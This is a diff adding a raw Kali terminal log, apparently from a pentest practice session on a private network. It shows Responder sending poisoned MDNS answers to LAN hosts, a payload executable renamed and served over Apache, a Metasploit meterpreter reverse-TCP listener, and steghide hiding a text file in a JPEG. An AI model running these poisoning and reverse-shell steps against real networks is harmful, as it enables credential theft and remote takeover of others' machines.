@@ -1,0 +1,368 @@
+┌──(msafa㉿kali)-[~/Pentest/Responder]
+└─$ sudo responder -I eth0 -Pdv
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [ON]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [OFF]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.0.117]
+    Responder IPv6             [fe80::e435:77ff:fe12:6472]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-VX2V9O1TOUW]
+    Responder Domain Name      [Q7TG.LOCAL]
+    Responder DCE-RPC Port     [47785]
+
+[+] Listening for events...                                                                                 
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+[!] Error starting TCP server on port 5985, check permissions or other servers running.
+[!] Error starting TCP server on port 3389, check permissions or other servers running.
+[!] Error starting TCP server on port 135, check permissions or other servers running.
+[!] Error starting TCP server on port 3128, check permissions or other servers running.
+[!] Error starting TCP server on port 445, check permissions or other servers running.
+[!] Error starting TCP server on port 139, check permissions or other servers running.
+[!] Error starting TCP server on port 88, check permissions or other servers running.
+[!] Error starting TCP server on port 1433, check permissions or other servers running.
+[!] Error starting TCP server on port 21, check permissions or other servers running.
+[!] Error starting TCP server on port 389, check permissions or other servers running.
+[!] Error starting TCP server on port 110, check permissions or other servers running.
+[!] Error starting TCP server on port 25, check permissions or other servers running.
+[!] Error starting SSL server on port 5986, check permissions or other servers running.
+[!] Error starting TCP server on port 587, check permissions or other servers running.
+[!] Error starting SSL server on port 636, check permissions or other servers running.
+[!] Error starting TCP server on port 143, check permissions or other servers running.
+[!] Error starting TCP server on port 53, check permissions or other servers running.
+[!] Error starting SSL server on port 443, check permissions or other servers running.
+[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.118, MAC: 12:19:3F:50:9D:7C
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name WINDOWS-2RKLF86.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name WINDOWS-2RKLF86.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name WINDOWS-2RKLF86.local
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name WINDOWS-2RKLF86.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name wpad.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name wpad.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name wpad.local
+[*] [MDNS] Poisoned answer sent to 192.168.0.118   for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::c3f5:4688:9810:d641 for name wpad.local
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.103, MAC: 1A:D2:01:E6:89:08
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.106, MAC: 70:32:17:5D:C6:A9
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.120, MAC: AE:39:C6:7D:FC:AF
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.120, MAC: AE:39:C6:7D:FC:AF
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.120, MAC: AE:39:C6:7D:FC:AF
+[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.0.111, MAC: D0:7E:35:76:3B:67
+[+] Exiting...
+                                                                                              
+┌──(root㉿kali)-[/home/msafa]
+└─# service apache2 start        
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa]
+└─# service apache2 status
+● apache2.service - The Apache HTTP Server
+     Loaded: loaded (/usr/lib/systemd/system/apache2.service; disabled; preset: disabled)
+     Active: active (running) since Wed 2025-04-02 01:20:52 +06; 8s ago
+ Invocation: 023da037923c450cbca7b1b5ff1b4300
+       Docs: https://httpd.apache.org/docs/2.4/
+    Process: 1771 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+   Main PID: 1787 (apache2)
+      Tasks: 6 (limit: 3355)
+     Memory: 25.9M (peak: 26.5M)
+        CPU: 40ms
+     CGroup: /system.slice/apache2.service
+             ├─1787 /usr/sbin/apache2 -k start
+             ├─1790 /usr/sbin/apache2 -k start
+             ├─1791 /usr/sbin/apache2 -k start
+             ├─1792 /usr/sbin/apache2 -k start
+             ├─1793 /usr/sbin/apache2 -k start
+             └─1794 /usr/sbin/apache2 -k start
+
+Apr 02 01:20:51 kali systemd[1]: Starting apache2.service - The Apache HTTP Server...
+Apr 02 01:20:52 kali systemd[1]: Started apache2.service - The Apache HTTP Server.
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa]
+└─# cd /var/www/html      
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# mkdir share                                      
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# chmod -R 755 share    
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# ls         
+evil-files  index.html  index.nginx-debian.html  payload.exe  reverse.txt  share  shell.php
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# mv payload.exe ./share
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# ls share
+payload.exe
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# chown -R www-data:www-data share
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# mv payload.exe ./share/text.exe
+mv: cannot stat 'payload.exe': No such file or directory
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# mv ./share/payload.exe ./share/text.exe
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# ls share                               
+text.exe
+                                                                                                            
+┌──(root㉿kali)-[/var/www/html]
+└─# msfconsole  -q                         
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.0.119
+LHOST => 192.168.0.119
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.0.119:4444 
+
+
+
+
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# sudo apt install steghide -y 
+Installing:                     
+  steghide
+
+Installing dependencies:
+  libmcrypt4  libmhash2
+
+Suggested packages:
+  libmcrypt-dev  mcrypt
+
+Summary:
+  Upgrading: 0, Installing: 3, Removing: 0, Not Upgrading: 548
+  Download size: 294 kB
+  Space needed: 914 kB / 23.5 GB available
+
+Get:3 http://mirror.kku.ac.th/kali kali-rolling/main arm64 steghide arm64 0.5.1-15 [130 kB]
+Get:1 http://kali.download/kali kali-rolling/main arm64 libmcrypt4 arm64 2.5.8-8 [69.1 kB]
+Get:2 http://kali.download/kali kali-rolling/main arm64 libmhash2 arm64 0.9.9.9-10 [94.5 kB]
+Fetched 294 kB in 10s (28.0 kB/s)    
+Selecting previously unselected package libmcrypt4:arm64.
+(Reading database ... 461222 files and directories currently installed.)
+Preparing to unpack .../libmcrypt4_2.5.8-8_arm64.deb ...
+Unpacking libmcrypt4:arm64 (2.5.8-8) ...
+Selecting previously unselected package libmhash2:arm64.
+Preparing to unpack .../libmhash2_0.9.9.9-10_arm64.deb ...
+Unpacking libmhash2:arm64 (0.9.9.9-10) ...
+Selecting previously unselected package steghide.
+Preparing to unpack .../steghide_0.5.1-15_arm64.deb ...
+Unpacking steghide (0.5.1-15) ...
+Setting up libmhash2:arm64 (0.9.9.9-10) ...
+Setting up libmcrypt4:arm64 (2.5.8-8) ...
+Setting up steghide (0.5.1-15) ...
+Processing triggers for libc-bin (2.40-3) ...
+Processing triggers for man-db (2.13.0-1) ...
+Processing triggers for kali-menu (2025.1.1) ...
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# steghide embed -cf cover.jpg -ef secret.txt -sf stego.jpg
+Enter passphrase: 
+Re-Enter passphrase: 
+steghide: could not open the file "secret.txt".
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# echo "you will be jailed" > echo.txt
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# ls    
+CHANGELOG.md  OSX_launcher.sh  Responder.db  echo.txt  packets.py        servers
+Contributors  README.md        Responder.py  files     poisoners         settings.py
+DumpHash.py   Report.py        __pycache__   logs      report.txt        tools
+LICENSE       Responder.conf   certs         odict.py  requirements.txt  utils.py
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# steghide embed -cf ../../Downloads/pexels-photo.jpeg -ef echo.txt -sf stego.jpg
+Enter passphrase: 
+Re-Enter passphrase: 
+embedding "echo.txt" in "../../Downloads/pexels-photo.jpeg"... done
+writing stego file "stego.jpg"... done
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# ls
+CHANGELOG.md  OSX_launcher.sh  Responder.db  echo.txt  packets.py        servers      utils.py
+Contributors  README.md        Responder.py  files     poisoners         settings.py
+DumpHash.py   Report.py        __pycache__   logs      report.txt        stego.jpg
+LICENSE       Responder.conf   certs         odict.py  requirements.txt  tools
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# ls -al stego.jpg 
+-rw-r--r-- 1 root root 25953 Apr  2 02:11 stego.jpg
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# mv stego.jpg ../
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# rm -rf echo.txt
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# ls              
+CHANGELOG.md  OSX_launcher.sh  Responder.db  files       poisoners         settings.py
+Contributors  README.md        Responder.py  logs        report.txt        tools
+DumpHash.py   Report.py        __pycache__   odict.py    requirements.txt  utils.py
+LICENSE       Responder.conf   certs         packets.py  servers
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# mv report.txt ../
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest/Responder]
+└─# cd ../      
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# ls
+10.10.6.73.nmap_results.txt  active_scanning.sh  printerbug.py  stego.jpg
+Responder                    capture.pcap        report.txt
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# steghide extract -sf stego.jpg                                                 
+Enter passphrase: 
+wrote extracted data to "echo.txt".
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# ls
+10.10.6.73.nmap_results.txt  active_scanning.sh  echo.txt       report.txt
+Responder                    capture.pcap        printerbug.py  stego.jpg
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# nano echo.txt  
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# 
+
+
+
+
+
+
+
+
+
+
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# exiftool stego.jpg                  
+ExifTool Version Number         : 13.10
+File Name                       : stego.jpg
+Directory                       : .
+File Size                       : 26 kB
+File Modification Date/Time     : 2025:04:02 02:11:23+06:00
+File Access Date/Time           : 2025:04:02 02:13:26+06:00
+File Inode Change Date/Time     : 2025:04:02 02:12:15+06:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Image Width                     : 400
+Image Height                    : 600
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 400x600
+Megapixels                      : 0.240
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# steghide info stego.jpg       
+"stego.jpg":
+  format: jpeg
+  capacity: 1.5 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# steghide info stego.jpg
+"stego.jpg":
+  format: jpeg
+  capacity: 1.5 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "echo.txt":
+    size: 19.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+                                                                                                            
+┌──(root㉿kali)-[/home/msafa/Pentest]
+└─# 
